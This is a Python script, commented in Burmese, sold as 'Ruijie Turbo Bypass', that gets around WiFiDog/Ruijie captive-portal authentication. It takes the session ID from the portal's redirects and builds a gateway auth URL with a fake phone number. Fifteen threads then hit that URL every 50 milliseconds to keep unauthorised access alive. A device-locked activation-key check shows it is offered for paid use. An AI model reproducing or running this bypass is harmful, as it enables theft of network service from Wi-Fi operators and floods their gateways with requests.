import requests
import re
import urllib3
import time
import threading
import hashlib
import os
import uuid
from urllib.parse import urlparse, parse_qs, urljoin

# Error message များ မပြစေရန်
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- SETTINGS ---
PING_THREADS = 15      # Thread အရေအတွက်ကို ၁၅ ခုထိ တိုးမြှင့်ထားသည်
PING_INTERVAL = 0.05   # ပိုမိုမြန်ဆန်သော တုံ့ပြန်မှုအတွက် (၅၀ မီလီစက္ကန့်)
SECRET_SALT = "FIXED_SALT_999" 
LICENSE_FILE = "license.txt"

def get_device_id():
    """Device ID ထုတ်ယူခြင်း"""
    try:
        if os.path.exists("/proc/cpuinfo"):
            with open("/proc/cpuinfo", "r") as f:
                data = f.read()
                return hashlib.md5(data.encode()).hexdigest()[:12].upper()
        return hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:12].upper()
    except:
        return "DEV-FIXED-ID"

def verify_license(device_id, user_key):
    """License စစ်ဆေးခြင်း"""
    check = hashlib.sha256((device_id + SECRET_SALT).encode()).hexdigest()[:16].upper()
    return user_key == check

def check_real_internet():
    """အင်တာနက် တကယ်ရမရ အမြန်ဆုံးနည်းဖြင့် စစ်ဆေးခြင်း"""
    try:
        # Google ထက် ပိုမြန်သော gstatic ကို သုံးထားသည်
        return requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=2).status_code == 204
    except:
        return False

def high_speed_ping(auth_link, session, sid):
    """အင်တာနက် မပြတ်စေရန် Keep-Alive လုပ်ပေးသည့် ပင်မ Logic"""
    while True:
        try:
            start_time = time.time()
            response = session.get(auth_link, timeout=5)
            ping_ms = int((time.time() - start_time) * 1000)
            
            # အင်တာနက် Status စစ်ဆေးခြင်း
            is_internet = check_real_internet()
            internet_status = "True" if is_internet else "False"
            
            # ပုံထဲကလို Log format ပုံစံထုတ်ခြင်း
            current_time = time.strftime('%H-%M-%S')
            print(f"Log: {{time: {current_time}, status: {response.status_code}, ping: {ping_ms}, IsInternetAccess: {internet_status}}}")
            
            # အင်တာနက် ပြတ်နေပါက ပိုမိုမြန်ဆန်စွာ Ping မည်၊ ရနေပါက သတ်မှတ် interval အတိုင်းသွားမည်
            if not is_internet:
                time.sleep(0.01)
            else:
                time.sleep(PING_INTERVAL)
        except:
            # Error တက်လျှင် Thread ကို မရပ်ဘဲ ခဏနားပြီး ပြန်ပတ်မည်
            time.sleep(1)
            continue

def start_process():
    device_id = get_device_id()
    print(f"\n==============================")
    print(f"   RUIJIE TURBO BYPASS v2.1 (PRO)")
    print(f"==============================")
    print(f"DEVICE ID: {device_id}")

    saved_key = None
    if os.path.exists(LICENSE_FILE):
        with open(LICENSE_FILE, "r") as f:
            saved_key = f.read().strip()
            if not verify_license(device_id, saved_key):
                saved_key = None

    if not saved_key:
        user_key = input("Enter Activation Key: ").strip()
        if verify_license(device_id, user_key):
            with open(LICENSE_FILE, "w") as f:
                f.write(user_key)
            print("[+] Activation Success!")
        else:
            print("[!] Invalid Key! Please contact admin.")
            return
    else:
        print("[+] License Verified!")

    print(f"[*] Monitoring Connection... (Turbo Mode: ON)")
    
    while True:
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            
            # အင်တာနက် မရသေးပါက Portal URL ကို ရှာမည်
            if r.status_code != 204:
                portal_url = r.url
                parsed_portal = urlparse(portal_url)
                
                # SID ရှာဖွေခြင်း logic
                r1 = session.get(portal_url, verify=False, timeout=10)
                path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
                next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
                r2 = session.get(next_url, verify=False, timeout=10)
                
                sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
                if not sid:
                    sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                    sid = sid_match.group(1) if sid_match else None
                
                if sid:
                    params = parse_qs(parsed_portal.query)
                    gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                    gw_port = params.get('gw_port', ['2060'])[0]
                    auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                    print(f"\n[*] New Session: {sid}")
                    print(f"[*] Launching {PING_THREADS} Turbo Threads...")

                    for _ in range(PING_THREADS):
                        t = threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True)
                        t.start()

                    # Thread များ အလုပ်လုပ်နေစဉ် အင်တာနက် ပြတ်/မပြတ် စောင့်ကြည့်ခြင်း (Interval တိုတိုဖြင့်)
                    while True:
                        if not check_real_internet():
                            print("\n[!] Connection Lost! Re-initializing...")
                            break 
                        time.sleep(2) # ၂ စက္ကန့်တစ်ခါ အမြဲစစ်နေမည်
            else:
                # အင်တာနက် ရနေလျှင်လည်း Log အနည်းငယ် ပြပေးရန်
                print(f"[{time.strftime('%H:%M:%S')}] Connection Active. High-speed monitoring...", end='\r')
                time.sleep(1)

        except Exception as e:
            time.sleep(2)

if __name__ == "__main__":
    start_process()
